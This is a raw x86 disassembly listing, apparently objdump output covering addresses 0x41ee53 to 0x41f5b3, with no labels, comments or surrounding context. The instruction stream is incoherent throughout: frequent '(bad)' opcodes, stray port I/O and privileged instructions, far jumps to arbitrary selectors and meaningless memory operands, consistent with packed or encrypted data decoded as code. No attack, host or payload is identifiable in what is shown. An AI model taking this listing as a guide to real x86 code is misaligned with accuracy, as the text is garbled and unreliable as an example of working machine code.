  41ee53:	pop    eax
  41ee54:	iret   
  41ee55:	push   ecx
  41ee56:	push   0xffffffc4
  41ee58:	cmp    bh,BYTE PTR [edi+edi*4-0x4087d85d]
  41ee5f:	xor    ah,bl
  41ee61:	arpl   WORD PTR [ebp+0x13af9f8],bx
  41ee67:	jb     0x41ee3c
  41ee69:	xchg   edi,eax
  41ee6a:	repz aam 0xfc
  41ee6d:	not    dl
  41ee6f:	mov    ds:0x4866037b,eax
  41ee74:	and    al,0x90
  41ee76:	leave  
  41ee77:	nop
  41ee78:	sbb    al,0xc8
  41ee7a:	rcl    DWORD PTR [esi+ecx*8+0x0],cl
  41ee7e:	jmp    0xa9c2:0x8a69aec1
  41ee85:	add    DWORD PTR ds:0xa7f0f37b,0xc8bce162
  41ee8f:	xor    bl,dh
  41ee91:	fidiv  WORD PTR [ecx-0x12]
  41ee94:	sub    bl,dl
  41ee96:	lods   al,BYTE PTR ds:[esi]
  41ee97:	shr    BYTE PTR [ebp-0x72be7a42],0x65
  41ee9e:	dec    edi
  41ee9f:	fwait
  41eea0:	add    BYTE PTR [edi-0x2c70a638],ch
  41eea6:	lods   al,BYTE PTR ds:[esi]
  41eea7:	jnp    0x41eea2
  41eea9:	cld    
  41eeaa:	(bad)  [ebx]
  41eeac:	and    BYTE PTR [edi+0x59],ch
  41eeaf:	mov    dl,0xdc
  41eeb1:	pop    ecx
  41eeb2:	add    ebx,DWORD PTR [esi]
  41eeb4:	dec    ebp
  41eeb5:	sti    
  41eeb6:	lds    ebp,FWORD PTR [ebp+esi*2-0x26]
  41eeba:	pop    es
  41eebb:	stos   DWORD PTR es:[edi],eax
  41eebc:	sub    DWORD PTR [ecx-0x1c],0x7f42d0ce
  41eec3:	xchg   DWORD PTR [edi+0x7e],ebp
  41eec6:	sub    DWORD PTR [edi-0x7ece1142],edx
  41eecc:	mov    al,ds:0x43bdd4a4
  41eed1:	mov    bh,0x44
  41eed3:	scas   eax,DWORD PTR es:[edi]
  41eed4:	idiv   DWORD PTR [edx-0x217f581c]
  41eeda:	fstp   TBYTE PTR [edx]
  41eedc:	xchg   edx,eax
  41eedd:	mov    dl,0xe8
  41eedf:	cwde   
  41eee0:	es push si
  41eee3:	aaa    
  41eee4:	pushf  
  41eee5:	mov    cl,0xe3
  41eee7:	cld    
  41eee8:	pop    edi
  41eee9:	mov    al,ds:0x7bfb4515
  41eeee:	cmp    al,0x4d
  41eef0:	pop    DWORD PTR [edx-0x25f6c10e]
  41eef6:	dec    ecx
  41eef7:	pop    ecx
  41eef8:	mov    bl,0x21
  41eefa:	das    
  41eefb:	es mov esi,0xe4a425d0
  41ef01:	jmp    0xcf7ca77c
  41ef06:	ficomp WORD PTR [edi]
  41ef08:	ds (bad) 
  41ef0a:	loop   0x41ef25
  41ef0c:	shl    DWORD PTR [edi+esi*1+0x23],0xf2
  41ef11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef12:	retf   0x6b23
  41ef15:	repz rcl DWORD PTR [eax+0x1a3998f3],cl
  41ef1c:	aaa    
  41ef1d:	jmp    FWORD PTR [eax+0x9]
  41ef20:	push   ds
  41ef21:	pop    eax
  41ef22:	jmp    0x3966:0x202feb5f
  41ef29:	daa    
  41ef2a:	test   DWORD PTR ds:0xc0e82ad,edi
  41ef30:	adc    ebx,DWORD PTR [esi-0x7]
  41ef33:	lods   eax,DWORD PTR ds:[esi]
  41ef34:	or     BYTE PTR [edi-0x35445fb3],bh
  41ef3a:	and    eax,0x92a3a2a6
  41ef3f:	xchg   esi,eax
  41ef40:	push   cs
  41ef41:	out    dx,eax
  41ef42:	pop    ecx
  41ef43:	sub    edi,DWORD PTR [ebp-0x30]
  41ef46:	(bad)  
  41ef47:	imul   ecx,DWORD PTR [ebp+0x55238eda],0xdb61a5ce
  41ef51:	sahf   
  41ef52:	mov    BYTE PTR [edi],ah
  41ef54:	lea    esi,[ecx-0x5e78ea85]
  41ef5a:	icebp  
  41ef5b:	mov    bl,0x75
  41ef5d:	out    0xc5,eax
  41ef5f:	int3   
  41ef60:	(bad)  
  41ef61:	xchg   esp,eax
  41ef62:	inc    edi
  41ef63:	test   al,0x34
  41ef65:	sbb    bl,bh
  41ef67:	xchg   esp,eax
  41ef68:	and    DWORD PTR [edx],edi
  41ef6a:	sub    ecx,DWORD PTR [ebp-0x148a0360]
  41ef70:	jl     0x41efb0
  41ef72:	jg     0x41ef24
  41ef74:	out    0x3,eax
  41ef76:	clc    
  41ef77:	lods   eax,DWORD PTR ds:[esi]
  41ef78:	loop   0x41ef62
  41ef7a:	fs lahf 
  41ef7c:	mov    edx,0x29cfe458
  41ef81:	sti    
  41ef82:	pop    ebx
  41ef83:	sahf   
  41ef84:	sbb    BYTE PTR [ebx],bl
  41ef86:	(bad)  
  41ef87:	lods   eax,DWORD PTR ds:[esi]
  41ef88:	inc    eax
  41ef89:	pop    es
  41ef8a:	das    
  41ef8b:	cmp    BYTE PTR [edi+0x6ab8db3b],0x3a
  41ef92:	or     edx,DWORD PTR [ebp+0x3]
  41ef95:	fadd   DWORD PTR ds:[edx+0x7c]
  41ef99:	out    dx,al
  41ef9a:	jo     0x41efcc
  41ef9c:	xchg   ebp,eax
  41ef9d:	test   esp,esp
  41ef9f:	adc    dl,ah
  41efa1:	cmp    BYTE PTR [eax-0x2a7f47d4],bh
  41efa7:	or     al,0x62
  41efa9:	or     BYTE PTR [esi+0x62],ah
  41efac:	adc    al,0x52
  41efae:	pushf  
  41efaf:	into   
  41efb0:	rol    DWORD PTR [ebx],cl
  41efb2:	enter  0x9e85,0xf6
  41efb6:	adc    DWORD PTR [edx-0x420e3f68],0xd8cc94a4
  41efc0:	iret   
  41efc1:	adc    DWORD PTR [eax],0xffffff8d
  41efc4:	jmp    0xb1f8458d
  41efc9:	sub    eax,0x6ffec950
  41efce:	sub    al,ah
  41efd0:	and    esp,DWORD PTR [ebp-0x8]
  41efd3:	js     0x41ef8f
  41efd5:	lock std 
  41efd7:	retf   0xfaee
  41efda:	shl    bl,1
  41efdc:	test   eax,0x77669db2
  41efe1:	popf   
  41efe2:	push   ebp
  41efe3:	neg    ah
  41efe5:	xchg   BYTE PTR [eax+0x713189f8],bl
  41efeb:	aam    0x18
  41efed:	(bad)  
  41efee:	mov    edx,0xc88b163b
  41eff3:	fdiv   DWORD PTR [esi-0x3d]
  41eff6:	stc    
  41eff7:	and    esp,DWORD PTR ds:0x99edada1
  41effd:	xchg   edx,eax
  41effe:	jns    0x41f00c
  41f000:	mov    ecx,0x6cc0cdb0
  41f005:	out    0xd0,eax
  41f007:	stos   BYTE PTR es:[edi],al
  41f008:	pop    es
  41f009:	mov    esi,0x3c813999
  41f00e:	lahf   
  41f00f:	cmp    BYTE PTR [edi+0x39644a53],0x8a
  41f016:	fstp   TBYTE PTR [esi+ebp*1]
  41f019:	cli    
  41f01a:	jo     0x41efee
  41f01c:	aaa    
  41f01d:	psrlw  mm1,mm1
  41f020:	mov    edx,0xe02b3f0a
  41f025:	shl    DWORD PTR [edi-0x3f],1
  41f028:	or     dh,BYTE PTR [ebx+edi*8-0x54]
  41f02c:	jmp    0xc809:0xabf5a844
  41f033:	adc    BYTE PTR ss:[ecx-0xe],0x1c
  41f038:	jns    0x41f050
  41f03a:	bswap  esp
  41f03c:	mov    ds:0xd651d721,al
  41f041:	bound  esi,QWORD PTR ds:0x92c54418
  41f047:	xchg   esp,eax
  41f048:	loope  0x41f093
  41f04a:	gs xchg esp,eax
  41f04c:	(bad)  
  41f04d:	in     eax,dx
  41f04e:	push   es
  41f04f:	stc    
  41f050:	adc    al,0x28
  41f052:	stos   DWORD PTR es:[edi],eax
  41f053:	pop    esi
  41f054:	mov    ebp,0x69403c8
  41f059:	(bad)
  41f05d:	pop    ebx
  41f05e:	or     DWORD PTR [ebp+0x7a],esp
  41f061:	dec    ebx
  41f062:	aas    
  41f063:	xchg   esp,eax
  41f064:	jmp    0x41f0b7
  41f066:	ret    0x5bcc
  41f069:	sbb    ecx,DWORD PTR [eax-0x5a]
  41f06c:	pop    esi
  41f06d:	push   ss
  41f06e:	sub    ebp,ecx
  41f070:	call   0xfc6087f7
  41f075:	cwde   
  41f076:	dec    ecx
  41f077:	into   
  41f078:	fwait
  41f079:	scas   eax,DWORD PTR es:[edi]
  41f07a:	jp     0x41f0db
  41f07c:	stos   DWORD PTR es:[edi],eax
  41f07d:	in     al,0x3c
  41f07f:	push   ss
  41f080:	adc    DWORD PTR [eax+esi*8-0x65290d43],eax
  41f087:	addr16 aaa 
  41f089:	aam    0xcb
  41f08b:	stos   BYTE PTR es:[edi],al
  41f08c:	jp     0x41f0ed
  41f08e:	inc    edi
  41f08f:	sbb    al,0xd8
  41f091:	mov    bl,0x50
  41f093:	dec    edi
  41f094:	outs   dx,BYTE PTR ds:[esi]
  41f095:	sbb    al,0x35
  41f097:	jno    0x41f03f
  41f099:	push   es
  41f09a:	cs ret 0xb34
  41f09e:	xchg   ebp,eax
  41f09f:	or     eax,0xde62c6e8
  41f0a4:	mov    ch,0x95
  41f0a6:	stos   DWORD PTR es:[edi],eax
  41f0a7:	cmc    
  41f0a8:	aad    0xee
  41f0aa:	sbb    DWORD PTR [esi+0x62772156],ecx
  41f0b0:	mov    ch,0x48
  41f0b2:	xor    ebx,DWORD PTR [edi]
  41f0b4:	xchg   ebp,eax
  41f0b5:	mov    cl,0xc1
  41f0b7:	xor    al,0xd0
  41f0b9:	adc    bl,dh
  41f0bb:	sub    bh,ch
  41f0bd:	lds    eax,FWORD PTR es:[ebx+0x698c9b1]
  41f0c4:	into   
  41f0c5:	or     ebp,DWORD PTR [edx-0x73b1ea9f]
  41f0cb:	pop    ds
  41f0cc:	jae    0x41f0bd
  41f0ce:	and    al,0x74
  41f0d0:	mov    eax,ds:0x37bcd12d
  41f0d5:	add    ebp,DWORD PTR [ecx]
  41f0d7:	cmp    eax,0x24593e52
  41f0dc:	je     0x41f151
  41f0de:	imul   esp,DWORD PTR [ebp-0x5a],0xffffffd6
  41f0e2:	sub    BYTE PTR [edx-0x15253ea5],dl
  41f0e8:	(bad)  
  41f0e9:	ret    
  41f0ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0eb:	sub    DWORD PTR ds:0xe3c1dc55,0x15
  41f0f2:	iret   
  41f0f3:	loope  0x41f134
  41f0f5:	popa   
  41f0f6:	push   esi
  41f0f7:	adc    al,0xcd
  41f0f9:	cwde   
  41f0fa:	sbb    al,0x6f
  41f0fc:	pop    esi
  41f0fd:	icebp  
  41f0fe:	prefetch BYTE PTR [eax+ecx*4]
  41f102:	xor    DWORD PTR [edx-0x6e],esi
  41f105:	(bad)  
  41f106:	mov    al,ds:0x6299aafb
  41f10b:	sbb    eax,0x8bd6bd6b
  41f110:	dec    esi
  41f111:	push   eax
  41f112:	or     DWORD PTR [ecx-0x60],esi
  41f115:	add    eax,0x8ceea1a1
  41f11a:	enter  0x1e58,0xbc
  41f11e:	cld    
  41f11f:	add    DWORD PTR [ebp-0x1d],ebx
  41f122:	xchg   esi,eax
  41f123:	push   edx
  41f124:	mov    cl,0xaa
  41f126:	jp     0x41f0c4
  41f128:	xchg   ebx,eax
  41f129:	push   edx
  41f12a:	cmp    BYTE PTR [edi+ebx*2+0x3c],al
  41f12e:	mov    bl,0xd
  41f130:	retf   
  41f131:	ficom  DWORD PTR [ecx]
  41f133:	mov    cl,0x3
  41f135:	lods   eax,DWORD PTR ds:[esi]
  41f136:	pop    ebp
  41f137:	mov    ds:0x94bedbef,al
  41f13c:	test   eax,0x2bf25df
  41f141:	inc    esi
  41f142:	push   edi
  41f143:	or     ch,dh
  41f145:	jle    0x41f1aa
  41f147:	mov    al,ds:0xd7b16386
  41f14c:	arpl   WORD PTR [ebp-0x6f],bp
  41f14f:	jecxz  0x41f187
  41f151:	adc    DWORD PTR [edi],edi
  41f153:	sub    eax,0x63889be7
  41f158:	adc    ch,BYTE PTR [edx-0x369ac7cb]
  41f15e:	mov    WORD PTR [eax],ss
  41f160:	out    dx,eax
  41f161:	pop    edi
  41f162:	fwait
  41f163:	jle    0x41f1dc
  41f165:	or     edi,edx
  41f167:	xor    DWORD PTR [ebx+0x58cc243c],ebx
  41f16d:	fwait
  41f16e:	xor    DWORD PTR [edi],0x67
  41f171:	or     eax,0xd9651fa0
  41f176:	push   ebp
  41f177:	mov    dl,ah
  41f179:	cmp    DWORD PTR [ebp-0x50],esi
  41f17c:	add    DWORD PTR [edx-0x5b],ebp
  41f17f:	dec    ebp
  41f180:	and    dh,BYTE PTR [ebx-0x7d9603a6]
  41f186:	shl    DWORD PTR [edx],1
  41f188:	jne    0x41f187
  41f18a:	rcr    esi,0xc7
  41f18d:	dec    esi
  41f18e:	in     eax,dx
  41f18f:	aas    
  41f190:	mov    bh,0x88
  41f192:	or     sp,WORD PTR [ecx-0x37]
  41f196:	ins    BYTE PTR es:[edi],dx
  41f197:	mov    al,0x13
  41f199:	xor    DWORD PTR ds:0x66520b8c,edx
  41f19f:	inc    ecx
  41f1a0:	(bad)  
  41f1a1:	adc    DWORD PTR [ebx-0xd94d6b6],eax
  41f1a7:	dec    ebp
  41f1a8:	xchg   esi,eax
  41f1a9:	mov    dl,0xf
  41f1ab:	lds    esi,FWORD PTR [ecx+edi*4+0x419a1e8a]
  41f1b2:	pop    ss
  41f1b3:	sbb    DWORD PTR [eax],ebp
  41f1b5:	jmp    0xaaa3:0x576638a2
  41f1bc:	and    eax,DWORD PTR [edi-0x7b]
  41f1bf:	retf   0x78d0
  41f1c2:	xor    esi,DWORD PTR [ebx]
  41f1c4:	push   0xffffffaa
  41f1c6:	mov    WORD PTR [esi-0x70d1f7e1],?
  41f1cc:	pop    es
  41f1cd:	inc    edx
  41f1ce:	adc    BYTE PTR [ebx],0xbd
  41f1d1:	dec    ebx
  41f1d2:	push   ss
  41f1d3:	jge    0x41f20c
  41f1d5:	sub    dl,cl
  41f1d7:	mov    edi,0x85826ba5
  41f1dc:	push   edi
  41f1dd:	cs mov edi,0xab6a0b24
  41f1e3:	mov    ds:0xa3d689c8,al
  41f1e8:	pop    ecx
  41f1e9:	xor    dl,BYTE PTR [edi-0x6c]
  41f1ec:	call   0x265:0x2d43edf9
  41f1f3:	in     eax,0x5
  41f1f5:	ss dec eax
  41f1f7:	(bad)  
  41f1f8:	(bad)  
  41f1f9:	or     al,0xf9
  41f1fb:	cmp    eax,0x2369ea10
  41f200:	xor    BYTE PTR ds:0xc421094c,0x70
  41f207:	xor    eax,0x7faebdc2
  41f20c:	out    dx,eax
  41f20d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f20e:	cmp    ecx,esp
  41f210:	mov    esi,0x133a71b9
  41f215:	push   ss
  41f216:	dec    edi
  41f217:	mov    bh,0xb6
  41f219:	add    eax,DWORD PTR [eax-0x5bd0caeb]
  41f21f:	inc    esi
  41f220:	gs mov al,0xc0
  41f223:	cdq    
  41f224:	ds pop esi
  41f226:	adc    al,0x11
  41f228:	sub    al,0x1
  41f22a:	in     al,dx
  41f22b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f22c:	pop    edi
  41f22d:	dec    ebp
  41f22e:	inc    ebp
  41f22f:	push   0xe6e4ec01
  41f234:	mov    eax,ds:0x94d70a6a
  41f239:	daa    
  41f23a:	sar    DWORD PTR [edx-0x7a],1
  41f23d:	gs daa 
  41f23f:	(bad)  
  41f240:	nop
  41f241:	inc    edi
  41f242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f243:	fldcw  WORD PTR [esi-0x1b]
  41f246:	stos   BYTE PTR es:[edi],al
  41f247:	push   ds
  41f248:	xor    al,0x59
  41f24a:	cmp    BYTE PTR [esi-0x44],dl
  41f24d:	dec    ebp
  41f24e:	sbb    DWORD PTR ds:0x95db42d5,edi
  41f254:	adc    dl,BYTE PTR [edi+0x27]
  41f257:	or     BYTE PTR [eax],0x92
  41f25a:	ret    0x38e7
  41f25d:	mov    ebx,ecx
  41f25f:	inc    eax
  41f260:	test   cl,0x1f
  41f263:	mov    dh,0x96
  41f265:	call   0xd765a703
  41f26a:	or     ah,BYTE PTR [ebx+eiz*2+0x3f]
  41f26e:	add    DWORD PTR [eax],edx
  41f270:	jl     0x41f2b9
  41f272:	shl    dl,cl
  41f274:	xor    BYTE PTR [eax],cl
  41f276:	inc    edx
  41f277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f278:	or     ax,0x388d
  41f27c:	xchg   ebp,eax
  41f27d:	ret    
  41f27e:	jp     0x41f296
  41f280:	rcr    ecx,0x3b
  41f283:	rol    ebp,1
  41f285:	xlat   BYTE PTR ds:[ebx]
  41f286:	mov    al,ds:0x6b5e820f
  41f28b:	xchg   di,ax
  41f28d:	(bad)  
  41f28e:	loopne 0x41f25b
  41f290:	sub    dl,cl
  41f292:	cmp    eax,0xc1d51bb9
  41f297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f298:	cmp    al,0x19
  41f29a:	(bad)  
  41f29b:	aam    0xff
  41f29d:	or     al,0xc2
  41f29f:	mov    cl,0x4a
  41f2a1:	mov    ebp,0xa0f47e5
  41f2a6:	outs   dx,DWORD PTR ds:[si]
  41f2a8:	mov    ds:0xa37d3b06,al
  41f2ad:	adc    ebp,DWORD PTR [esi+0xd]
  41f2b0:	jp     0x41f24a
  41f2b2:	jmp    0x41f316
  41f2b4:	fs sub dh,bl
  41f2b7:	test   esp,ebx
  41f2b9:	inc    esi
  41f2ba:	es add al,0x4b
  41f2bd:	adc    eax,0x645690d3
  41f2c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2c3:	adc    eax,eax
  41f2c5:	scas   al,BYTE PTR es:[edi]
  41f2c6:	add    BYTE PTR [edx-0x3],0xb6
  41f2ca:	adc    eax,0x9c5e4bba
  41f2cf:	xor    al,0x5d
  41f2d1:	loop   0x41f315
  41f2d3:	aas    
  41f2d4:	adc    DWORD PTR [bx+si-0x3205],0x13
  41f2da:	xchg   DWORD PTR [edx+0x28],eax
  41f2dd:	test   BYTE PTR ds:0x28b21b5b,al
  41f2e3:	ins    BYTE PTR es:[edi],dx
  41f2e4:	nop
  41f2e5:	jb     0x41f2bf
  41f2e7:	cli    
  41f2e8:	cli    
  41f2e9:	pop    ecx
  41f2ea:	xor    DWORD PTR [edi],ebp
  41f2ec:	sbb    DWORD PTR [esi+edi*2+0x51c64bd3],esp
  41f2f3:	pop    esp
  41f2f4:	xchg   ebp,eax
  41f2f5:	call   0xe4fa:0xaa513c7
  41f2fc:	in     al,0xcf
  41f2fe:	xor    BYTE PTR [edx+0x40],cl
  41f301:	cmc    
  41f302:	in     al,0xfe
  41f304:	jae    0x41f370
  41f306:	call   0x66e951a1
  41f30b:	xchg   BYTE PTR [edx],cl
  41f30d:	or     edi,DWORD PTR [edi-0x26fe1acf]
  41f313:	fst    st(0)
  41f315:	xchg   edi,eax
  41f316:	dec    esp
  41f317:	lock and ch,BYTE PTR [edx+ebx*2]
  41f31b:	fwait
  41f31c:	mov    DWORD PTR [eax+0x2d],ebx
  41f31f:	mov    al,0xeb
  41f321:	popf   
  41f322:	jns    0x41f300
  41f324:	div    BYTE PTR [esi+0x5a85a1d3]
  41f32a:	(bad)  
  41f32b:	cmp    ebx,esp
  41f32d:	xchg   edx,eax
  41f32e:	out    dx,al
  41f32f:	es in  eax,dx
  41f331:	xor    BYTE PTR [ebx-0x89194ca],dl
  41f337:	fiadd  WORD PTR [edi]
  41f339:	sub    al,0xde
  41f33b:	or     bl,cl
  41f33d:	rol    BYTE PTR [eax+edi*1+0x20],0x18
  41f342:	gs cmp al,0x98
  41f345:	mov    al,ds:0xe31a2911
  41f34a:	mov    dl,0xa6
  41f34c:	ss inc esi
  41f34e:	adc    esp,DWORD PTR [eax]
  41f350:	or     ah,BYTE PTR ds:0x7eb8d307
  41f356:	push   0xffffffc4
  41f358:	rcr    DWORD PTR [ecx],0xde
  41f35b:	mov    ds:0xbb30961b,eax
  41f360:	imul   esi,DWORD PTR ss:[ebx],0xd013b1ec
  41f367:	outs   dx,BYTE PTR ds:[esi]
  41f368:	loope  0x41f2f3
  41f36a:	retf   
  41f36b:	cmp    bh,ah
  41f36d:	mov    dh,0x25
  41f36f:	daa    
  41f370:	jl     0x41f323
  41f372:	or     esi,DWORD PTR [edi-0x14440704]
  41f378:	jmp    0xf72d67ee
  41f37d:	sub    BYTE PTR [ebx-0x5c024180],ah
  41f383:	out    0xea,eax
  41f385:	stos   DWORD PTR es:[edi],eax
  41f386:	jg     0x41f400
  41f388:	into   
  41f389:	add    bh,BYTE PTR [ebx-0x39cac93a]
  41f38f:	enter  0xd52f,0x4f
  41f393:	mov    al,0xa8
  41f395:	ins    DWORD PTR es:[edi],dx
  41f396:	jno    0x41f3bc
  41f398:	in     al,dx
  41f399:	outs   dx,BYTE PTR ds:[esi]
  41f39a:	pop    eax
  41f39b:	in     al,0x72
  41f39d:	sub    al,0x14
  41f39f:	mov    ebp,0x99df19f7
  41f3a4:	(bad)  
  41f3a5:	std    
  41f3a6:	(bad)  
  41f3a7:	pushf  
  41f3a8:	loopne 0x41f3ab
  41f3aa:	test   DWORD PTR [esi+0x56],esp
  41f3ad:	push   edx
  41f3ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3af:	sub    DWORD PTR [eax-0x7603ebdf],esp
  41f3b5:	gs sahf 
  41f3b7:	jnp    0x41f428
  41f3b9:	scas   eax,DWORD PTR es:[edi]
  41f3ba:	test   DWORD PTR [ecx+0x3e],edi
  41f3bd:	add    ah,BYTE PTR [eax-0x550ec1b8]
  41f3c3:	mov    edi,esi
  41f3c5:	push   cs
  41f3c6:	ins    BYTE PTR es:[edi],dx
  41f3c7:	sbb    eax,0x2c313e47
  41f3cc:	icebp  
  41f3cd:	hlt    
  41f3ce:	fadd   DWORD PTR [edx]
  41f3d0:	mov    dl,0x96
  41f3d2:	add    al,0x0
  41f3d4:	adc    eax,0x465140fa
  41f3d9:	lock (bad) 
  41f3db:	mov    esp,0x56e66fbe
  41f3e0:	retf   
  41f3e1:	fs mov bl,0x21
  41f3e4:	mov    DWORD PTR [edi],ebp
  41f3e6:	imul   esi,DWORD PTR [edi+0x25281435],0x2a
  41f3ed:	or     al,0xd4
  41f3ef:	int3   
  41f3f0:	mov    dl,BYTE PTR [ebp+0x7b]
  41f3f3:	iret   
  41f3f4:	stos   DWORD PTR es:[edi],eax
  41f3f5:	fimul  WORD PTR [eax-0x33ad08c]
  41f3fb:	adc    eax,0xcb8f6b6
  41f400:	retf   0x4fe1
  41f403:	test   BYTE PTR [edx+ebp*8+0x7a],bl
  41f407:	cmp    al,0x12
  41f409:	(bad)  
  41f40a:	or     DWORD PTR [eax],eax
  41f40c:	xchg   esp,eax
  41f40d:	ss dec ebp
  41f40f:	call   0x4c52:0x1aed6415
  41f416:	(bad)  
  41f417:	daa    
  41f418:	data16 aam 0xc7
  41f41b:	mov    ecx,0xec4e4327
  41f420:	ins    BYTE PTR es:[edi],dx
  41f421:	mov    edi,0x720fe970
  41f426:	adc    DWORD PTR [edx+0x34],ecx
  41f429:	rol    BYTE PTR [edi+ecx*4],cl
  41f42c:	outs   dx,DWORD PTR ds:[esi]
  41f42d:	call   0xc34c:0x19982cff
  41f434:	push   esi
  41f435:	jne    0x41f3f6
  41f437:	xchg   ebp,eax
  41f438:	xor    esi,DWORD PTR [ecx-0x49fa5bd7]
  41f43e:	mov    al,0x5a
  41f440:	stos   DWORD PTR es:[edi],eax
  41f441:	sub    al,0xa
  41f443:	into   
  41f444:	xchg   ecx,eax
  41f445:	ret    
  41f446:	adc    dl,bh
  41f448:	jae    0x41f409
  41f44a:	das    
  41f44b:	mov    dl,0x6a
  41f44d:	push   edx
  41f44e:	cmp    eax,0xd38fc8c7
  41f453:	sbb    ebx,DWORD PTR [edi-0x5d]
  41f456:	xor    DWORD PTR [ecx-0x57],esi
  41f459:	xchg   ebx,eax
  41f45a:	mov    ah,0xee
  41f45c:	fdiv   st,st(3)
  41f45e:	pusha  
  41f45f:	pop    ecx
  41f460:	pusha  
  41f461:	push   ebp
  41f462:	mov    dl,0xb1
  41f464:	frstor [edi-0x57]
  41f467:	int3   
  41f468:	repz pop ebp
  41f46a:	sub    DWORD PTR [edx-0x45bd60f3],ebx
  41f470:	xor    ch,dl
  41f472:	dec    eax
  41f473:	retf   0x50bb
  41f476:	cli    
  41f477:	mov    edi,0xd40184fb
  41f47c:	sub    eax,0x3ba5e9fa
  41f481:	shl    BYTE PTR [ecx+0x6c],1
  41f484:	xchg   ebx,eax
  41f485:	adc    ah,BYTE PTR [edx]
  41f487:	pop    esi
  41f488:	inc    edx
  41f489:	loopne 0x41f419
  41f48b:	adc    al,0x6c
  41f48d:	pop    esi
  41f48e:	cmp    BYTE PTR [ebp+0x5f],cl
  41f491:	outs   dx,DWORD PTR ds:[esi]
  41f492:	jnp    0x41f4a2
  41f494:	test   DWORD PTR [ecx+0x69],ebx
  41f497:	jmp    0x6959:0x963eb1b9
  41f49e:	retf   
  41f49f:	lahf   
  41f4a0:	retf   0x6289
  41f4a3:	inc    esp
  41f4a4:	ret    
  41f4a5:	jmp    0x18ed45c8
  41f4aa:	sub    ebx,edx
  41f4ac:	sbb    ebx,DWORD PTR [eax]
  41f4ae:	out    0x8d,eax
  41f4b0:	lea    ecx,[ebx+0x47]
  41f4b3:	jne    0x41f51a
  41f4b5:	inc    ecx
  41f4b6:	mov    ebp,0x6736262b
  41f4bb:	lods   eax,DWORD PTR ds:[esi]
  41f4bc:	jbe    0x41f4b4
  41f4be:	xchg   DWORD PTR [ebx+0x6d],ebp
  41f4c1:	xchg   esi,eax
  41f4c2:	outs   dx,BYTE PTR ds:[esi]
  41f4c3:	pop    ss
  41f4c4:	xchg   DWORD PTR [edx],ebp
  41f4c6:	mov    eax,ds:0x514ff505
  41f4cb:	sub    ebx,0x4a7f5de2
  41f4d1:	inc    eax
  41f4d2:	jne    0x41f4c2
  41f4d4:	loopne 0x41f4db
  41f4d6:	adc    BYTE PTR [esi+0x2],0xbb
  41f4da:	jl     0x41f45d
  41f4dc:	repnz dec edi
  41f4de:	pop    ax
  41f4e0:	cwde   
  41f4e1:	mov    edi,0xec19af11
  41f4e6:	mov    edi,DWORD PTR [eax]
  41f4e8:	inc    edx
  41f4e9:	add    eax,0x4bf9e912
  41f4ee:	and    DWORD PTR [ecx+0x42],esp
  41f4f1:	push   esi
  41f4f2:	test   eax,0x4b5201
  41f4f7:	lds    ebp,FWORD PTR [esi+0x6b6549a2]
  41f4fd:	pop    ds
  41f4fe:	loop   0x41f56a
  41f500:	and    eax,DWORD PTR [ecx+0x6f]
  41f503:	jecxz  0x41f543
  41f505:	mov    eax,0xd82b89c5
  41f50a:	out    dx,al
  41f50b:	and    DWORD PTR [edi+ecx*4],ecx
  41f50e:	addr16 out 0xbd,al
  41f511:	ss sbb eax,0xb8fb6ff8
  41f517:	jnp    0x41f519
  41f519:	test   DWORD PTR [ecx+0x288520e4],edx
  41f51f:	cmp    BYTE PTR [esi+0x49],dh
  41f522:	adc    BYTE PTR [ecx+0x1f],dh
  41f525:	push   es
  41f526:	pop    ds
  41f527:	mov    al,0xd8
  41f529:	ret    0x34db
  41f52c:	cwde   
  41f52d:	cs iret 
  41f52f:	push   cs
  41f530:	cmp    BYTE PTR [ebx-0x622b4a21],bh
  41f536:	leave  
  41f537:	dec    ebx
  41f538:	inc    eax
  41f539:	jne    0x41f5ad
  41f53b:	rcl    BYTE PTR [eax+eax*2],cl
  41f53e:	div    bh
  41f540:	jae    0x41f4d1
  41f542:	ret    0x6f4d
  41f545:	add    eax,0x97b534ce
  41f54a:	add    DWORD PTR ds:[esi-0x36],esi
  41f54e:	sbb    ebp,DWORD PTR [ebp-0x7299d6b]
  41f554:	dec    ecx
  41f555:	retf   0x1e98
  41f558:	and    eax,0x73f60e7
  41f55d:	pop    eax
  41f55e:	mov    ds:0xc2959e80,al
  41f563:	stos   BYTE PTR es:[edi],al
  41f564:	ins    BYTE PTR es:[edi],dx
  41f565:	lds    ebp,FWORD PTR [edi+0x8]
  41f568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f569:	jb     0x41f4f7
  41f56b:	adc    DWORD PTR [esp+ecx*4+0x3ca14dc9],esi
  41f572:	xor    ebp,DWORD PTR [ecx]
  41f574:	retf   
  41f575:	dec    ebp
  41f576:	xchg   ebx,eax
  41f577:	fnstsw WORD PTR [esi+0x4a]
  41f57a:	ret    
  41f57b:	push   0x411cb79b
  41f580:	dec    edx
  41f581:	jmp    0x41f538
  41f583:	cmp    al,0xec
  41f585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f586:	mov    bh,0x13
  41f588:	dec    esi
  41f589:	inc    ecx
  41f58a:	push   edi
  41f58b:	(bad)  
  41f58c:	dec    esp
  41f58d:	ins    BYTE PTR es:[edi],dx
  41f58e:	pushf  
  41f58f:	sti    
  41f590:	dec    ecx
  41f591:	aad    0xfd
  41f593:	add    eax,0x2c12e4cd
  41f598:	pop    ss
  41f599:	test   DWORD PTR [esi+edi*8-0x66],0x73dc468d
  41f5a1:	inc    edx
  41f5a2:	fndisi(8087 only) 
  41f5a4:	jae    0x41f572
  41f5a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5a7:	jg     0x41f52b
  41f5a9:	mov    dl,0xe2
  41f5ab:	fwait
  41f5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5ad:	inc    esp
  41f5ae:	adc    eax,eax
  41f5b0:	dec    DWORD PTR [esi+0x76]
  41f5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
